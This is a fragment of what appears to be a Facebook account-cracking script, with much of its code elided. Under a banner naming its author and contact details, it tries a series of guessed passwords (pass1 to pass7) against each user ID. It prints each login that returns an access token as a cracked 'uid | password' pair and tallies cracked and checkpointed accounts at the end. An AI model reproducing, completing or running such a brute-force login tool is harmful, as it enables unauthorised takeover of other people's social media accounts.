...
\033[1;96m(~)\033[1;97m Owner : Aamir  Balouch

\033[1;96m(~)\033[1;97m Github : https://github.com/aamirbalouch786

\033[1;96m(~)\033[1;97m Fb     : https://www.facebook.com/Aamir.balouch.7860 
\033[1;96m(~)\033[1;97m WhatsApp +16175402466: Maa Tujhe Salam
...
def menu_select():
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		    	...
		    	if "access_token" in d:
		            ...
		            print("\x1b[1;96m[aamir-ok] "+uid+" | "+pass1+"\x1b[1;0m")
		            ...
		            if 'www.facebook.com' in d['error_msg']:
		                ...
		                if 'access_token' in d:
		                    ...
		                    print("\x1b[1;96m[aamir-ok] "+uid+" | "+pass2+"\x1b[1;0m")
		                    ...
		                    if 'www.facebook.com' in d['error_msg']:
		                        ...
		                        if 'access_token' in d:
		                            ...
		                            print(" \x1b[1;96m[aamir-ok] "+uid+" | "+pass3+"\x1b[1;0m")
		                            ...
		                            if 'www.facebook.com' in d['error_msg']:
		                                ...
		                                if 'access_token' in d:
		                                    ...
		                                    print("\x1b[1;96m[aamir-ok] "+uid+" | "+pass4+"\x1b[1;0m")
		                                    ...
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        ...
		                                        if 'access_token' in d:
		                                            ...
		                                            print("\x1b[1;96m[aamir-ok] "+uid+" | "+pass5+"\x1b[1;0m")
		                                            ...
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                ...
		                                                if 'access_token' in d:
		                                                    ...
		                                                    print("\x1b[1;96m[aamir-ok] "+uid+" | "+pass6+"\x1b[1;0m")
		                                                    ...
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        ...
		                                                        if 'access_token' in d:
		                                                            ...
		                                                            print("\x1b[1;96m[aamir-ok] "+uid+" | "+pass7+"\x1b[1;0m")
	...
	print ("[!] Total Aamir-cp/aamir-ok : "+str(len(cps)) + "/"+str(len(oks)))
